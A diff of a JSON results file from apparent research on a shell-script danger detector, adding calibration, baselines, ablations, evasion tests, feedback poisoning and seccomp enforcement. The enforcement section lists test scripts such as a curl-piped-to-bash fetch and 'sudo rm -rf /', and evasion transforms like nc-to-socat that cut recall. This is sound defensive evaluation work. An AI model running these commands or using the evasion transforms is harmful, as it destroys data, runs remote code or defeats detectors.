@@ -1,6 +1,6 @@
 {
   "meta": {
-    "generated_at_utc": "2026-07-02T08:12:10.258607+00:00",
+    "generated_at_utc": "2026-07-03T15:47:26.761720+00:00",
     "seed": 1337,
     "epochs": 40,
     "test_fraction": 0.4,
@@ -759,14 +759,14 @@
   "rq2_latency": {
     "n_scripts": 420,
     "repeats_per_script": 3,
-    "mean_ms": 0.6947056333268891,
-    "median_ms": 0.6514655000273706,
-    "p95_ms": 1.3052659999175376,
-    "p99_ms": 1.522509999858812,
-    "min_ms": 0.2951980000034382,
-    "max_ms": 1.6648549999445095,
-    "stdev_ms": 0.2586562310439507,
-    "throughput_scripts_per_sec": 1439.4586023595073
+    "mean_ms": 0.5275431261896388,
+    "median_ms": 0.49131499997656647,
+    "p95_ms": 1.0008640001615277,
+    "p99_ms": 1.1129429999527929,
+    "min_ms": 0.21926399995209067,
+    "max_ms": 1.316405999887138,
+    "stdev_ms": 0.202024302122123,
+    "throughput_scripts_per_sec": 1895.5796225094296
   },
   "rq3_baseline": {
     "available": true,
@@ -1638,6 +1638,557 @@
         "lexical_disguise": 0.0,
         "both": 0.671
       }
+    }
+  },
+  "rq_revision": {
+    "rq7_calibration": {
+      "n_bins": 10,
+      "raw": {
+        "ece": 0.07606188685212706,
+        "brier": 0.060902150521528794,
+        "bins": [
+          {
+            "lo": 0.0,
+            "hi": 0.1,
+            "count": 5,
+            "confidence": 0.08181095899713847,
+            "accuracy": 0.0
+          },
+          {
+            "lo": 0.1,
+            "hi": 0.2,
+            "count": 67,
+            "confidence": 0.16976431943233936,
+            "accuracy": 0.029850746268656716
+          },
+          {
+            "lo": 0.2,
+            "hi": 0.30000000000000004,
+            "count": 13,
+            "confidence": 0.22111324228553986,
+            "accuracy": 0.15384615384615385
+          },
+          {
+            "lo": 0.30000000000000004,
+            "hi": 0.4,
+            "count": 7,
+            "confidence": 0.33904179688967734,
+            "accuracy": 0.2857142857142857
+          },
+          {
+            "lo": 0.4,
+            "hi": 0.5,
+            "count": 10,
+            "confidence": 0.4480180451735082,
+            "accuracy": 0.5
+          },
+          {
+            "lo": 0.5,
+            "hi": 0.6000000000000001,
+            "count": 0,
+            "confidence": null,
+            "accuracy": null
+          },
+          {
+            "lo": 0.6000000000000001,
+            "hi": 0.7000000000000001,
+            "count": 2,
+            "confidence": 0.6395054958779511,
+            "accuracy": 1.0
+          },
+          {
+            "lo": 0.7000000000000001,
+            "hi": 0.8,
+            "count": 0,
+            "confidence": null,
+            "accuracy": null
+          },
+          {
+            "lo": 0.8,
+            "hi": 0.9,
+            "count": 3,
+            "confidence": 0.8742132146021505,
+            "accuracy": 1.0
+          },
+          {
+            "lo": 0.9,
+            "hi": 1.0,
+            "count": 61,
+            "confidence": 0.9857245762879113,
+            "accuracy": 0.9836065573770492
+          }
+        ]
+      },
+      "isotonic": {
+        "ece": 0.05468962801259686,
+        "brier": 0.054851271850882316
+      },
+      "platt": {
+        "ece": 0.08379904257711478,
+        "brier": 0.059038987172136285
+      },
+      "reliability_raw": [
+        {
+          "lo": 0.0,
+          "hi": 0.1,
+          "count": 5,
+          "confidence": 0.08181095899713847,
+          "accuracy": 0.0
+        },
+        {
+          "lo": 0.1,
+          "hi": 0.2,
+          "count": 67,
+          "confidence": 0.16976431943233936,
+          "accuracy": 0.029850746268656716
+        },
+        {
+          "lo": 0.2,
+          "hi": 0.30000000000000004,
+          "count": 13,
+          "confidence": 0.22111324228553986,
+          "accuracy": 0.15384615384615385
+        },
+        {
+          "lo": 0.30000000000000004,
+          "hi": 0.4,
+          "count": 7,
+          "confidence": 0.33904179688967734,
+          "accuracy": 0.2857142857142857
+        },
+        {
+          "lo": 0.4,
+          "hi": 0.5,
+          "count": 10,
+          "confidence": 0.4480180451735082,
+          "accuracy": 0.5
+        },
+        {
+          "lo": 0.5,
+          "hi": 0.6000000000000001,
+          "count": 0,
+          "confidence": null,
+          "accuracy": null
+        },
+        {
+          "lo": 0.6000000000000001,
+          "hi": 0.7000000000000001,
+          "count": 2,
+          "confidence": 0.6395054958779511,
+          "accuracy": 1.0
+        },
+        {
+          "lo": 0.7000000000000001,
+          "hi": 0.8,
+          "count": 0,
+          "confidence": null,
+          "accuracy": null
+        },
+        {
+          "lo": 0.8,
+          "hi": 0.9,
+          "count": 3,
+          "confidence": 0.8742132146021505,
+          "accuracy": 1.0
+        },
+        {
+          "lo": 0.9,
+          "hi": 1.0,
+          "count": 61,
+          "confidence": 0.9857245762879113,
+          "accuracy": 0.9836065573770492
+        }
+      ]
+    },
+    "rq8_stronger_baselines": {
+      "gbdt_on_acte_features": {
+        "precision": 0.9850746268656716,
+        "recall": 0.868421052631579,
+        "f1": 0.9230769230769231,
+        "mcc": 0.8716915300838031,
+        "accuracy": 0.9345238095238095,
+        "false_positive_rate": 0.010869565217391304,
+        "false_negative_rate": 0.13157894736842105,
+        "specificity": 0.9891304347826086,
+        "confusion_matrix": {
+          "tn": 91,
+          "fp": 1,
+          "fn": 10,
+          "tp": 66
+        },
+        "support": {
+          "n": 168,
+          "positives": 76,
+          "negatives": 92
+        },
+        "roc_auc": 0.971824942791762,
+        "pr_auc": 0.9773699155515706
+      },
+      "union_features_plus_tfidf": {
+        "precision": 0.987012987012987,
+        "recall": 1.0,
+        "f1": 0.9934640522875817,
+        "mcc": 0.98807114368361,
+        "accuracy": 0.9940476190476191,
+        "false_positive_rate": 0.010869565217391304,
+        "false_negative_rate": 0.0,
+        "specificity": 0.9891304347826086,
+        "confusion_matrix": {
+          "tn": 91,
+          "fp": 1,
+          "fn": 0,
+          "tp": 76
+        },
+        "support": {
+          "n": 168,
+          "positives": 76,
+          "negatives": 92
+        },
+        "roc_auc": 0.9998569794050343,
+        "pr_auc": 0.9998279940281327
+      },
+      "tfidf_logreg_tuned": {
+        "precision": 0.9736842105263158,
+        "recall": 0.9736842105263158,
+        "f1": 0.9736842105263158,
+        "mcc": 0.9519450800915332,
+        "accuracy": 0.9761904761904762,
+        "false_positive_rate": 0.021739130434782608,
+        "false_negative_rate": 0.02631578947368421,
+        "specificity": 0.9782608695652174,
+        "confusion_matrix": {
+          "tn": 90,
+          "fp": 2,
+          "fn": 2,
+          "tp": 74
+        },
+        "support": {
+          "n": 168,
+          "positives": 76,
+          "negatives": 92
+        },
+        "roc_auc": 0.999141876430206,
+        "pr_auc": 0.9989939294286837,
+        "best_C": 4.0
+      },
+      "note": "CodeBERT/StarEncoder baseline omitted: model weights are not downloadable in this offline environment; documented as future work."
+    },
+    "cluster_bootstrap": {
+      "n_templates": 60,
+      "n_samples": 168,
+      "point": {
+        "precision": 0.9848484848484849,
+        "recall": 0.8552631578947368,
+        "f1": 0.9154929577464789,
+        "false_positive_rate": 0.010869565217391304
+      },
+      "cluster_bootstrap": {
+        "precision": {
+          "low": 0.9423076923076923,
+          "high": 1.0
+        },
+        "recall": {
+          "low": 0.6621403661726243,
+          "high": 0.9816555462885738
+        },
+        "f1": {
+          "low": 0.7903176025487854,
+          "high": 0.9846268656716418
+        },
+        "false_positive_rate": {
+          "low": 0.0,
+          "high": 0.0388444698267656
+        }
+      },
+      "naive_bootstrap": {
+        "precision": {
+          "low": 0.9508196721311475,
+          "high": 1.0
+        },
+        "recall": {
+          "low": 0.7702702702702703,
+          "high": 0.9285714285714286
+        },
+        "f1": {
+          "low": 0.863990909090909,
+          "high": 0.9583333333333334
+        },
+        "false_positive_rate": {
+          "low": 0.0,
+          "high": 0.034492782678428174
+        }
+      },
+      "width_ratio": {
+        "precision": 1.17,
+        "recall": 2.02,
+        "f1": 2.06,
+        "false_positive_rate": 1.13
+      }
+    },
+    "real_world_fpr_wilson": {
+      "point": 0.0,
+      "low": 0.0,
+      "high": 0.16113012549493322
+    },
+    "ablation_significance": {
+      "full_f1": 0.9154929577464789,
+      "comparisons": {
+        "no_semantic": {
+          "f1": 0.9103448275862069,
+          "delta_f1": -0.0051,
+          "mcnemar_p": 1.0,
+          "significant_at_0.05": false,
+          "n_discordant": 3
+        },
+        "no_context": {
+          "f1": 0.9305555555555556,
+          "delta_f1": 0.0151,
+          "mcnemar_p": 0.5,
+          "significant_at_0.05": false,
+          "n_discordant": 2
+        },
+        "no_threat": {
+          "f1": 0.8108108108108109,
+          "delta_f1": -0.1047,
+          "mcnemar_p": 0.0070003666914999485,
+          "significant_at_0.05": true,
+          "n_discordant": 32
+        },
+        "no_feedback": {
+          "f1": 0.8470588235294118,
+          "delta_f1": -0.0684,
+          "mcnemar_p": 0.012540951371192932,
+          "significant_at_0.05": true,
+          "n_discordant": 28
+        }
+      }
+    },
+    "rq6b_adversarial_budget": {
+      "n_dangerous": 76,
+      "detectors": {
+        "ACTE": {
+          "original_recall": 0.8552631578947368,
+          "per_attack": {
+            "rm_to_find": 0.8289473684210527,
+            "nc_to_socat": 0.8157894736842105,
+            "devtcp_to_socat": 0.7894736842105263,
+            "curlpipe_to_staged": 0.7368421052631579,
+            "curl_to_python": 0.8552631578947368
+          },
+          "all_transforms": 0.5789473684210527,
+          "evasion_at_max_budget": 0.276
+        },
+        "TF-IDF + LogReg": {
+          "original_recall": 0.9736842105263158,
+          "per_attack": {
+            "rm_to_find": 0.9736842105263158,
+            "nc_to_socat": 0.9736842105263158,
+            "devtcp_to_socat": 0.9736842105263158,
+            "curlpipe_to_staged": 0.9736842105263158,
+            "curl_to_python": 0.9736842105263158
+          },
+          "all_transforms": 0.9736842105263158,
+          "evasion_at_max_budget": 0.0
+        },
+        "TF-IDF + LinearSVM": {
+          "original_recall": 0.9736842105263158,
+          "per_attack": {
+            "rm_to_find": 0.9736842105263158,
+            "nc_to_socat": 0.9736842105263158,
+            "devtcp_to_socat": 0.9736842105263158,
+            "curlpipe_to_staged": 0.9736842105263158,
+            "curl_to_python": 0.9736842105263158
+          },
+          "all_transforms": 0.9736842105263158,
+          "evasion_at_max_budget": 0.0
+        },
+        "TF-IDF + RandomForest": {
+          "original_recall": 1.0,
+          "per_attack": {
+            "rm_to_find": 1.0,
+            "nc_to_socat": 1.0,
+            "devtcp_to_socat": 1.0,
+            "curlpipe_to_staged": 1.0,
+            "curl_to_python": 1.0
+          },
+          "all_transforms": 1.0,
+          "evasion_at_max_budget": 0.0
+        }
+      }
+    },
+    "rq9_concept_drift": {
+      "drift_category": "obfuscated",
+      "n_base_train": 365,
+      "n_adapt": 28,
+      "n_eval": 27,
+      "frozen_recall_on_novel": 1.0,
+      "online_recall_on_novel": 1.0,
+      "recall_recovered": 0.0
+    },
+    "rq9_feedback_poisoning": {
+      "threshold": 0.5,
+      "canary_id": "obfuscated_0304",
+      "canary_start_risk": 1.0,
+      "poisoned_labels_to_flip": 6,
+      "risk_trajectory": [
+        0.999,
+        0.994,
+        0.971,
+        0.876,
+        0.632,
+        0.382
+      ],
+      "note": "A small number of attacker-controlled 'safe' feedback labels on a dangerous script suffices to flip its decision; the online loop needs authenticated, rate-limited, multi-party feedback in deployment."
+    },
+    "rq10_enforcement": {
+      "seccomp_available": true,
+      "n_scripts": 5,
+      "n_all_correct": 5,
+      "results": [
+        {
+          "script": "ls -la /tmp",
+          "commands": [
+            "ls"
+          ],
+          "needs_network": false,
+          "needs_spawn": false,
+          "denied_syscalls": [
+            "connect",
+            "execve",
+            "execveat",
+            "ptrace",
+            "recvfrom",
+            "sendto",
+            "socket"
+          ],
+          "enforcement": {
+            "denied:connect": {
+              "killed_by_kernel": true,
+              "expected_kill": true,
+              "correct": true
+            },
+            "control:getpid": {
+              "killed_by_kernel": false,
+              "expected_kill": false,
+              "correct": true
+            }
+          },
+          "all_correct": true
+        },
+        {
+          "script": "cat /etc/hosts",
+          "commands": [
+            "cat"
+          ],
+          "needs_network": false,
+          "needs_spawn": false,
+          "denied_syscalls": [
+            "connect",
+            "execve",
+            "execveat",
+            "ptrace",
+            "recvfrom",
+            "sendto",
+            "socket"
+          ],
+          "enforcement": {
+            "denied:connect": {
+              "killed_by_kernel": true,
+              "expected_kill": true,
+              "correct": true
+            },
+            "control:getpid": {
+              "killed_by_kernel": false,
+              "expected_kill": false,
+              "correct": true
+            }
+          },
+          "all_correct": true
+        },
+        {
+          "script": "curl -fsSL http://x/i | bash",
+          "commands": [
+            "bash",
+            "curl"
+          ],
+          "needs_network": true,
+          "needs_spawn": true,
+          "denied_syscalls": [
+            "ptrace"
+          ],
+          "enforcement": {
+            "denied:ptrace": {
+              "killed_by_kernel": true,
+              "expected_kill": true,
+              "correct": true
+            },
+            "control:getpid": {
+              "killed_by_kernel": false,
+              "expected_kill": false,
+              "correct": true
+            }
+          },
+          "all_correct": true
+        },
+        {
+          "script": "sudo rm -rf / --no-preserve-root",
+          "commands": [
+            "sudo"
+          ],
+          "needs_network": false,
+          "needs_spawn": true,
+          "denied_syscalls": [
+            "connect",
+            "ptrace",
+            "recvfrom",
+            "sendto",
+            "socket"
+          ],
+          "enforcement": {
+            "denied:connect": {
+              "killed_by_kernel": true,
+              "expected_kill": true,
+              "correct": true
+            },
+            "control:getpid": {
+              "killed_by_kernel": false,
+              "expected_kill": false,
+              "correct": true
+            }
+          },
+          "all_correct": true
+        },
+        {
+          "script": "tar -czf /tmp/b.tgz /var/data",
+          "commands": [
+            "tar"
+          ],
+          "needs_network": false,
+          "needs_spawn": false,
+          "denied_syscalls": [
+            "connect",
+            "execve",
+            "execveat",
+            "ptrace",
+            "recvfrom",
+            "sendto",
+            "socket"
+          ],
+          "enforcement": {
+            "denied:connect": {
+              "killed_by_kernel": true,
+              "expected_kill": true,
+              "correct": true
+            },
+            "control:getpid": {
+              "killed_by_kernel": false,
+              "expected_kill": false,
+              "correct": true
+            }
+          },
+          "all_correct": true
+        }
+      ]
     }
   }
 }
